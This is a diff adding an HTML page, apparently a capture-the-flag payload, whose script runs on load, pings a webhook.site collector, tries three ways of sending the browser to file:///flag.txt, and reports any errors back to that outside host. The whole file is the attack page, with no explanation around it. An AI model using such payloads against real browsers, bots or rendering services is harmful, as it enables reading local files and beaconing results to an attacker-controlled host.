@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+<script>
+// Try to use browser's navigation directly
+function tryDirectNavigation() {
+    // Send initial ping
+    fetch('https://webhook.site/bc26ecde-2e1b-4b01-af18-8d14d15de90f/?attempt=direct_navigation');
+    
+    // Try multiple navigation methods
+    setTimeout(() => {
+        try {
+            // Method 1: Replace current location
+            window.location.replace('file:///flag.txt');
+        } catch(e1) {
+            try {
+                // Method 2: Assign to location
+                window.location = 'file:///flag.txt';
+            } catch(e2) {
+                try {
+                    // Method 3: Use location.href
+                    window.location.href = 'file:///flag.txt';
+                } catch(e3) {
+                    // Report all failures
+                    fetch('https://webhook.site/bc26ecde-2e1b-4b01-af18-8d14d15de90f/?nav_errors=' + 
+                          encodeURIComponent(e1.message + '; ' + e2.message + '; ' + e3.message));
+                }
+            }
+        }
+    }, 500);
+}
+
+tryDirectNavigation();
+</script>
+<body>
+<p>Direct navigation attempt</p>
+</body>
+</html>
